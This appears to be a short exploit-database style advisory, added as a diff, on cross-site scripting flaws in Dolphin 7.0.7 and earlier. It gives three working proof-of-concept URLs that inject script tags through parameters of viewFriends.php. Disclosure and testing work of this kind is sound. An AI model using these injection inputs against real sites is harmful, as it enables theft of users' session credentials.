@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/52088/info
+
+Dolphin is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Dolphin 7.0.7 and prior versions are vulnerable. 
+
+http://www.example.com/dolph/viewFriends.php?iUser=1&page=1&per_page=32&sort=activity&photos_only='"><script>alert(/xss/)</script>
+http://www.example.com/dolph/viewFriends.php?iUser=1&page=1&per_page=32&sort=activity&online_only='"><script>alert(/xss/)</script>
+http://www.example.com/dolph/viewFriends.php?iUser=1&page=1&sort=activity&mode='"><script>alert(/xss/)</script> 
